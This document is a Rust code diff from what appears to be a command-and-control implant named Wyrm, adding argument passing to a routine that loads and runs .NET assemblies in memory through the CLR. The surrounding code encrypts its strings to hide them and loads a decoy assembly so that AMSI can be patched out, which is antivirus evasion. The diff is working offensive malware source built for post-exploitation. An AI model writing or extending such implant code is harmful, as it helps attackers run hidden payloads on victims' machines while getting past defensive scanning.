@@ -1,13 +1,19 @@
-use std::{ffi::c_void, ptr::null_mut};
+use std::{ffi::c_void, iter::once, ptr::null_mut};
 
 use shared::{task_types::DotExDataForImplant, tasks::WyrmResult};
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
-    Win32::System::{
-        ClrHosting::{CLRCreateInstance, CorRuntimeHost},
-        Com::SAFEARRAY,
-        Ole::{SafeArrayAccessData, SafeArrayCreateVector, SafeArrayUnaccessData},
-        Variant::{VARIANT, VT_UI1},
+    Win32::{
+        Foundation::SysAllocString,
+        System::{
+            ClrHosting::{CLRCreateInstance, CorRuntimeHost},
+            Com::SAFEARRAY,
+            Ole::{
+                SafeArrayAccessData, SafeArrayCreateVector, SafeArrayPutElement,
+                SafeArrayUnaccessData,
+            },
+            Variant::{VARIANT, VT_ARRAY, VT_BSTR, VT_UI1, VT_VARIANT},
+        },
     },
     core::GUID,
 };
@@ -20,12 +26,15 @@ use crate::{
 };
 
 pub enum DotnetError {
+    IntOverflow,
     ClrNotInitialised(i32),
     RuntimeNotInitialised(i32),
     CorHostNotInitialised(i32),
     CannotStartRuntime(i32),
+    ArgPutFailed(i32),
     AssemblyDataNull,
     SafeArrayNotInitialised,
+    NoArgsInInput,
 }
 
 impl DotnetError {
@@ -53,6 +62,18 @@ impl DotnetError {
             DotnetError::SafeArrayNotInitialised => {
                 sc!("SAFEARRAY could not be initialised", 73).unwrap()
             }
+            DotnetError::IntOverflow => sc!(
+                "An int overflow occurred, not continuing with operation.",
+                81
+            )
+            .unwrap(),
+            DotnetError::ArgPutFailed(i) => {
+                format!(
+                    "{} {i:#X}",
+                    sc!("Could not put args in commandline. Error code:", 73).unwrap()
+                )
+            }
+            DotnetError::NoArgsInInput => sc!("There were no arguments in the input.", 26).unwrap(),
         }
     }
 }
@@ -111,7 +132,7 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
         }
     };
 
-    match execute_dotnet_assembly(&deser.0) {
+    match execute_dotnet_assembly(&deser.0, &deser.1) {
         Ok(_) => WyrmResult::Ok(sc!("Assembly running.", 49).unwrap()),
         Err(e) => WyrmResult::Err(format!(
             "{} {}",
@@ -121,7 +142,7 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
     }
 }
 
-fn execute_dotnet_assembly(buf: &[u8]) -> Result<(), DotnetError> {
+fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetError> {
     //
     // Load the CLR into the process and setup environment to support
     //
@@ -136,6 +157,8 @@ fn execute_dotnet_assembly(buf: &[u8]) -> Result<(), DotnetError> {
     // Create a junk decoy safe array such that we force a load of AMSI to then patch out
     let decoy_buf = [0x00, 0x00, 0x00, 0x01];
     let p_decoy_sa = create_safe_array(&decoy_buf)?;
+
+    let p_args = make_params(args)?;
 
     //
     // First load the decoy binary into the process; this is to bring in amsi.dll such that we can patch
@@ -178,7 +201,7 @@ fn execute_dotnet_assembly(buf: &[u8]) -> Result<(), DotnetError> {
     // Now we can call the entrypoint via Invoke_3 which runs the assembly in our process
     //
     let vt = unsafe { &(*(*entryp).vtable) };
-    unsafe { (vt.Invoke_3)(entryp as *mut _, object, null_mut(), &mut retval) };
+    unsafe { (vt.Invoke_3)(entryp as *mut _, object, p_args, &mut retval) };
 
     // TODO this is very wrong lol
     println!("Ret val: {:?}", unsafe {
@@ -186,6 +209,66 @@ fn execute_dotnet_assembly(buf: &[u8]) -> Result<(), DotnetError> {
     });
 
     Ok(())
+}
+
+fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
+    let bstr_array = args_to_safe_array(args)?;
+
+    let outer = unsafe { SafeArrayCreateVector(VT_VARIANT as u16, 0, 1) };
+    if outer.is_null() {
+        return Err(DotnetError::SafeArrayNotInitialised);
+    }
+
+    //
+    // Wrap the inner String[]
+    //
+    let mut v: VARIANT = unsafe { std::mem::zeroed() };
+
+    v.Anonymous.Anonymous.vt = (VT_ARRAY | VT_BSTR) as u16;
+    v.Anonymous.Anonymous.Anonymous.parray = bstr_array;
+
+    let idx: i32 = 0;
+
+    let res = unsafe { SafeArrayPutElement(outer, &idx, &mut v as *mut _ as *mut _) };
+    if res != 0 {
+        return Err(DotnetError::ArgPutFailed(res));
+    }
+
+    Ok(outer)
+}
+
+/// Converts arguments intended for the running assembly to a SAFEARRAY
+fn args_to_safe_array(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
+    let num_args = args.len();
+
+    if num_args == 0 {
+        return Err(DotnetError::NoArgsInInput);
+    }
+
+    if num_args > u32::MAX as usize {
+        return Err(DotnetError::IntOverflow);
+    }
+
+    let p_sa = unsafe { SafeArrayCreateVector(VT_BSTR as u16, 0, num_args as u32) };
+
+    if p_sa.is_null() {
+        return Err(DotnetError::SafeArrayNotInitialised);
+    }
+
+    for (i, arg) in args.iter().enumerate() {
+        let wide: Vec<u16> = arg.encode_utf16().chain(once(0)).collect();
+
+        let res = unsafe {
+            let p_str = SysAllocString(wide.as_ptr());
+            SafeArrayPutElement(p_sa, &i as *const _ as *const _, p_str as *const _)
+        };
+
+        if res != 0 {
+            return Err(DotnetError::ArgPutFailed(res));
+        }
+    }
+
+    Ok(p_sa)
 }
 
 fn create_safe_array(buf: &[u8]) -> Result<*mut SAFEARRAY, DotnetError> {
